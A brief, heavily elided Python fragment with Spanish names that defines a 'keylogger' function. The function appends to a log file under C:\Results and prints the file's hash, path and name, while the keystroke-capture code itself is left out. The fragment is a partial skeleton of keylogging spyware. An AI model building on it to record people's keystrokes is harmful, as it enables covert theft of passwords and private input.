...
def keylogger(Keylogging_file='TeclasPulsadas_log.txt'):
    ...
    try:
        ...
        with open(f"C:\Results\{Keylogging_file}", "a") as archivo:
    ...
    print(f"Hash del archivo: {hash_file(f"C:\Results\{Keylogging_file}")}")
    print(f"Ubicacion del archivo: {f"C:\Results\{Keylogging_file}"}")
    print(f"Nombre del archivo: {Keylogging_file}")
